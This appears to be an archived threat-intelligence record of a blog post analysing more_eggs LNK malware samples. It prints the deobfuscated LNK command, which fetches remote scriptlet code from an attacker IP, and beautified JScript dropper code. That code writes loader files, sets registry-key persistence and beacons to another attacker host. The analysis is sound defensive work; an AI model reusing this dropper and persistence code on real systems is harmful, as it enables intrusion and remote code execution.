{
    "id": "5d7f6fb1-1d6a-4a4a-bf6d-108cd3a27da2",
    "created_at": "2023-04-05T02:09:08.742513Z",
    "updated_at": "2025-03-27T02:16:14.059398Z",
    "deleted_at": null,
    "sha1_hash": "1e846cd3dfab7fc856def56c81cab8176d5221a0",
    "title": "2023-03-10 - How Do You Like Dem Eggs- I like Mine Scrambled, Really Scrambled - A Look at Recent more_eggs Samples",
    "authors": "",
    "file_creation_date": "2023-04-03T08:26:40Z",
    "file_modification_date": "2023-04-03T08:26:40Z",
    "file_size": 432160,
    "plain_text": "# HOW DO YOU LIKE DEM EGGS? I LIKE MINE SCRAMBLED, REALLY SCRAMBELED - A LOOK AT A RECENT more_eggs SAMPLES\n\n**[sec0wn.blogspot.com/2023/03/how-do-you-like-dem-eggs-i-like-mine.html](https://sec0wn.blogspot.com/2023/03/how-do-you-like-dem-eggs-i-like-mine.html?m=1)**\n\nMo Bustami\n\n## BACKGROUND\n\n### The topic of discussion have been covered quite well in the past years. With some analysis focusing on the human element and actors behind the tools and other analysis attributing to different groups and some focusing on the malware and final payload.\n This blog will just focus on some recent samples related to what i think is more_eggs and my attempt (successful or not, I will let you be the judge of that) at analyzing them and some questions I have. I won't be discussing any attribution or provide my thoughts on that in this blog.\n\n## HIGH LEVEL ANALYSIS OF SAMPLES\n\n### This all started with a tweet - https://twitter.com/jaydinbas/status/1633063201607675909? s=20\n\n File Name: Axiance_Full_Reports[.]zip\n\n\n-----\n\n### Hash: 631f92c9147733acf3faa02586cd2a6cda673ec83c24252fccda1982cf3e96f6 The file is a ZIP file that include an LNK file and a JPG. The LNK as you would expect includes an obfuscated code within it that is consistent with these types of campaigns.\n```\n&&\nc!QlGg!!dFsw!!dFsw!!S5nNX4N6!\"k49ZUgX7=%!pKaN!!fJtJ!!oMCB!!PBuJ!\\!pocM!!nHka!!Vtvt!!Ug\n &&\nc!QlGg!!dFsw!!dFsw!!S5nNX4N6!\"9AB2eyHk=%!pKaN!!fJtJ!!oMCB!!PBuJ!\\!pocM!!nHka!!Ugrg!!po\n && (\n\n  for % t in (\"!vZRh!!hixu!!nHka!!iedc!!cMXL!!pocM!!oLOE!!MbnQ!!DDvC!\"\n\n    \"s!pocM!!yysv!!MbnQ!!QlGg!!pKaN!!Ugrg!!iedc!!nHka! =\n$!Assh!i!MbnQ!!CVhO!o!Assh!!cMXL! n!pKaN!!RkqG!\"\n\n\"!vZRh!!CVhO!!nHka!s!pKaN!!pocM!!MbnQ!!QlGg!!pKaN!!pocM!!oLOE!!MbnQ!!CVhO!!pocM!!iedc!\n\n    \"!opYD!!Vtvt!!IuyJ!!GgqK!!lmPv!!AFHZ!!NjEt!\"\n\n\"!vZRh!!CVhO!!nHka!!IMmt!!QlGg!!Ugrg!!dFsw!!pKaN!!pocM!!MbnQ!s!pKaN!!QlGg!!dFsw!!dFsw!\n\n\"!uZmj!!MbnQ!!jYoa!!nHka!!yysv!!pocM!!cMXL!!pKaN!!nHka!!iedc!!kfTF!!eVUC!!rjNA!!cMXL!!\n\n\"!CVhO!!nHka!!dFsw!!IMmt!!pocM!!dFsw!!nHka!!cMXL!!lmPv!!opYD!!Vtvt!!IuyJ!!GgqK!\"\n    \"!vZRh!!oijN!!AFHZ!!pChT!!oijN!!ihiq!!DDvC!\"\n\n\"!PBuJ!!NjEt!!NjEt!!PBuJ!\\!cMXL!!Iiwf!!jYoa!!oLOE!!AeOE!!dwJy!!DBOh!!HYYC!!ySTZ!!DBOh!\n\n    \"!vZRh!!opYD!!Vtvt!!IuyJ!!GgqK!!DDvC!\"\n\n\"!pocM!!nHka!!Ugrg!!pocM!!PBuJ!!Vtvt!!pKaN!!yysv!!LlDf!!AFHZ!!PBuJ!!FEKw!!pocM!!MbnQ!!\n\n    \"!vZRh!!cMXL!!pKaN!!iedc!!pocM!!MbnQ!!yysv!!cMXL!]\"\n\n    \"!cMXL!!nHka!!iedc!!hixu!!pocM!!Iiwf!!nHka!n!QlGg!m!nHka!!lmPv!!OJQo! '\"\n\n\"!cMXL!!ORXc!!oLOE!!iedc!!pKaN!!cMXL!!hixu!!Iiwf!!MbnQ!!QlGg!!fJtJ!!nHka!!lmPv!!OJQo!\n'\"\n    \"!Vtvt!!pKaN!!yysv!!LlDf!!AFHZ!!lmPv!!MbnQ!!pocM!!pKaN!\") do\n@!nHka!!Iiwf!!ORXc!!oLOE! % ~t) > \"!9AB2eyHk!\" && c!QlGg!!dFsw!!dFsw!c!oLOE!p!RSiK!/Y\n%!Assh!!pocM!!MbnQ!!CVhO!!pocM!!iedc!!PBuJ!\\!bnOY!!RSiK!!cMXL!!pKaN!!nHka!!fJtJ!!yNgq!\n %!pKaN!!fJtJ!!oMCB!!PBuJ!\\ && s!pKaN!!QlGg!!iedc!!pKaN! \"\"\n/!fJtJ!!pocM!!MbnQ!w!fJtJ!!pocM!!Iiwf!p!iedc!!oLOE!!Iiwf!!nHka!!cMXL!!cMXL!c!QlGg!l!dF\n -!AeOE!!QlGg!!cMXL!!nHka!!cMXL!!nHka!!pKaN!!pKaN!!pocM!!MbnQ!!yysv!!cMXL!\"\n\n \"!.%SystemRoot%\\System32\\SHELL32.dll\n Using the magic of cyberchef you can deobfuscate this and get something a bit cleaner\n\n```\n\n-----\n\n```\n&& call S5nNX4N6 k49ZUgX7 %tmp%\\ie4uinit.exe && call S5nNX4N6\n\"9AB2eyHk=%tmp%\\ieuinit.inf\" && (\n\n  for % t in (\"[version]\"\n\n    \"signature = $windows nt$\"\n\n    \"[destinationdirs]\"\n\n    \"A45E=01\"\n\n    \"[defaultinstall.windows7]\"\n\n    \"UnRegisterOCXs=F07FD\"\n\n    \"delfiles=A45E\"\n\n    \"[F07FD]\"\n\n    \"%11%\\scRobj,NI,http://172.86.75.75/robot.php\"\n\n    \"[A45E]\"\n\n    \"ieui%4tg90%.inf\"\n\n    \"[strings]\"\n\n    \"servicename=' '\"\n\n    \"shortsvcname=' '\"\n\n    \"4tg90=nit\") do @echo % ~t) > \"9AB2eyHk\" && call copy / Y % windir %\n\\System32\\ ie4uinit.exe % tmp % \\ && start \"\" / min wmic process call create\n\"k49ZUgX7 -basesettings\"\n\n\".%SystemRoot%\\System32\\SHELL32.dll\n\n## DOMO ARIGATO MR ROBOTO\n\n### I tried looking for the robot.php file associated with the above IP address in virus repositories but was not successful, probably due to me getting stale. However, I was able to find a variant of it in an LNK sample submitted to Hybrid Analysis and can be found at VirusTotal. The script is sizeable and heavily obfuscated. the closest to any analysis of something similar can be found at this expel blog but still it was not quite the same.\n\n While I can probably spend a whole blog going through the obfuscation and the\n\n```\n\n-----\n\n### deobfuscation logic, I would never be as good as (@Arkbird_SOLG), thier analysis is referenced in the intro. I also wanted to do this quickly. And as you might know, I have been relying on some old tools in the arsenal that seem to still work against these obfuscated scripts\n An old friend is a trusted one - Malzilla to the rescue. While the script broke Malzilla, it was still good enough to produce a deobfuscated output. you can see that I used document.write to get the output of the code\n\n here is partial output after it was beautified\n\n\n-----\n\n```\nvar WScriptShell NWgYzNFhUglH676(cApePRxKlMQqu834(atZLWcjMYNmeC751,\nuJqroxwXiRZAa975));\n\nvar DropperPath = WScriptShell.ExpandEnvironmentStrings(\"%appdata%\");\n\nDropperPath = DropperPath + \"\\\\Microsoft\\\\\";\n\nvar LoaderFileName = \"6HGRAI3D0RB72LRS.txt\";\n\nvar PersFileName = \"RRALRCEOH5NXDDOJVPNVFH.txt\";\n\nvar MsxslPath = DropperPath + cApePRxKlMQqu834(jHkwPHCIFnWO772, uJqroxwXiRZAa975);\n\nvar Decoded = MXZzNoSNqRUcKla430(EALrYFeDuAfV488, EALrYFeDuAfV488.length);\n\nvar ba = RyOCxzf831(Decoded, uJqroxwXiRZAa975);\n\nvar objFSO = NWgYzNFhUglH676(cApePRxKlMQqu834('qe)HZkC!=E|gs@q[6l6XsB8,VemdI[$X',\nuJqroxwXiRZAa975));\n\nif (!objFSO.FileExists(MsxslPath)) {\n\n  var actxobj = NWgYzNFhUglH676(cApePRxKlMQqu834(RgpeqURe598, uJqroxwXiRZAa975));\n\n  actxobj.open();\n\n  actxobj.position = 0;\n\n  actxobj.type = 2;\n\n  actxobj.charset = (437);\n\n  actxobj.writeText(aUxgUyvEj840(ba));\n\n  payload = 0;\n\n  actxobj.saveToFile(MsxslPath);\n\n  actxobj.close();\n\n}\n\nvar DecodedPayer = MXZzNoSNqRUcKla430(qctzvdIf439, qctzvdIf439.length);\n\nvar BBA = RyOCxzf831(DecodedPayer, uJqroxwXiRZAa975);\n\nvar pays = aUxgUyvEj840(BBA);\n\nSaveTextToFile(DropperPath + LoaderFileName, pays);\n\nvar DecodedPers = MXZzNoSNqRUcKla430(EoLfzNlg964, EoLfzNlg964.length);\n\nvar BBS = RyOCxzf831(DecodedPers, uJqroxwXiRZAa975);\n\nvar PersPays = aUxgUyvEj840(BBS);\n\nSaveTextToFile(DropperPath + PersFileName, PersPays);\n\nvar ActXobj1 = NWgYzNFhUglH676(cApePRxKlMQqu834(atZLWcjMYNmeC751, uJqroxwXiRZAa975));\n\nvar CommandToRun = 'cmd /c start /min \"\" \"' + MsxslPath + '\" \"' + DropperPath +\nLoaderFileName + '\" \"' + DropperPath + LoaderFileName + '\"';\n\ntry {\n\n  ActXobj1.RegWrite(\"HKCU\\\\Environment\\\\UserInitMprLogonScript\", 'cscript /b\n/e:jscript \"%APPDATA%\\\\Microsoft\\\\' + PersFileName + '\"');\n\n} catch (e) {}\n\ntry {\n\n  var vkxvlqbn570 = NWgYzNFhUglH676(cApePRxKlMQqu834('tFqdph]S\"tSe54u]`%gCA',\nuJqroxwXiRZAa975));\n\n  vkxvlqbn570.ShellExecute(cApePRxKlMQqu834(jHkwPHCIFnWO772, uJqroxwXiRZAa975),\nLoaderFileName + \" \" + LoaderFileName, DropperPath, \"\", 0);\n\n} catch (e) {}\n\ntry {\n\n  var vkxvlqbn570 =\nGetObject(cApePRxKlMQqu834('6C\"F%ZoiOuIDLit};iJX@QRg|*+XzMAXz{8\"4YN<fk;gZi4nQIun0Xzxca\n uJqroxwXiRZAa975));\n\n  var vkxvlqbn72 = vkxvlqbn570.Get(cApePRxKlMQqu834('aCAzD@WMfBMlp4p|',\nuJqroxwXiRZAa975)).Create(CommandToRun, null, null, 0);\n\n  if (vkxvlqbn72 !== 0) {\n\n    vkxvlqbn354;\n\n  }\n\n```\n\n-----\n\n```\n} catch (vkxvlqbn3118) {\n\n  try {\n\n    ActXobj1.Run(CommandToRun, 0, 0);\n\n    vkxvlqbn0937 = 1;\n\n  } catch (vkxvlqbn4910) {\n\n    vkxvlqbn0937 = 0;\n\n  }\n\n}\n\ntry {\n\n  var ConnectionLite;\n\n  try {\n\n    ConnectionLite = new ActiveXObject(\"MSXML2.ServerXMLHTTP\");\n\n  } catch (e) {\n\n    try {\n\n      ConnectionLite = new ActiveXObject(\"Msxml2.XMLHTTP.6.0\");\n\n    } catch (e) {\n\n      try {\n\n        ConnectionLite = new ActiveXObject(\"Msxml2.XMLHTTP.3.0\");\n\n      } catch (e2) {\n\n        ConnectionLite = new ActiveXObject(\"Microsoft.XMLHTTP\");\n\n      }\n\n    }\n\n  }\n\n  ConnectionLite.open(\"GET\", \"http://95.179.186.167/Writer.php?deploy=\" +\nCommandToRun, false);\n\n  ConnectionLite.send();\n\n} catch (ee) {}\n\n### If you want to rely on purely online tools, I stumbled across this one here and it seems to be working really well - https://onecompiler.com/javascript. You will just need to modify the code from document.write to console.log\n I hope the above code can be used to write detection and hunting rules, many of the variable names seem to be static once they are decoded so could be good start.\n And here is where my question or mystery beings. When I tried to do the same for the robot.php script from the original 172.86.75.75, the script seemed to be either missing or not decoding as I would like it to be. I tried messing with the logic and see if I missed anything but no dice. I am happy to share the script for anyone else who would like to take a look and I also uploaded it to VirusTotal\n\n## ADDITIONAL SAMPLES\n\n### I wanted to see if I can find additional \"recent\" samples of LNK files using similar obfuscation and delivery mechanism. I hunted using the \"behaviour_files:\"%TEMP%\\\\ieuinit.inf\"\" and according to VirusTotal below are the recent ones\n\n```\n\n-----\n\n### 631f92c9147733acf3faa02586cd2a6cda673ec83c24252fccda1982cf3e96f6 bfe048ba91218019b64ab8477dad3ba6033cbc584f0d751d2866023b2b546c2e 4ba964764210607f3bab884a14afa0b917891cff969a309bbbc12d3321386352 a99508a91168ebebb3779c8a69fbbc8c51cc019ba794b1e5f4c2d7a4c5b0777a 36bf06bde63af8cdd673444edf64a323195fe962b3256e0269cdd7a89a7e2ae1\n I did not go hunting for samples of the main obfuscated JS payload but there might be some additional samples laying around.\n I did not have time to go and do a telemetry analysis and infrastructure mapping of these campaigns but if I have some spare time I might put that down in another blogpost.\n\n## ONE FINAL EASTER EGG - see what I did there\n\n### For the 172.86.75.75, censys scan showed port 8080 open and it taking a quick look at it, it seemed like it was some sort of a C2 panel/access of potential victims, not sure if it is related to this campaign or something else\n\n Clicking on any of the buttons seems to potentially could show screenshots from victims emails/browser/etc\n\n## Clearing the MuddyWater - Analysis of new MuddyWater Samples\n\n PRB-Backdoor - A Fully Loaded PowerShell Backdoor with Evil Intentions\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-03-10 - How Do You Like Dem Eggs- I like Mine Scrambled, Really Scrambled - A Look at Recent more_eggs Samples.pdf"
    ],
    "report_names": [
        "2023-03-10 - How Do You Like Dem Eggs- I like Mine Scrambled, Really Scrambled - A Look at Recent more_eggs Samples.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1680660548,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1680510400,
    "ts_modification_date": 1680510400,
    "files": {
        "pdf": "https://archive.orkl.eu/1e846cd3dfab7fc856def56c81cab8176d5221a0.pdf",
        "text": "https://archive.orkl.eu/1e846cd3dfab7fc856def56c81cab8176d5221a0.txt",
        "img": "https://archive.orkl.eu/1e846cd3dfab7fc856def56c81cab8176d5221a0.jpg"
    }
}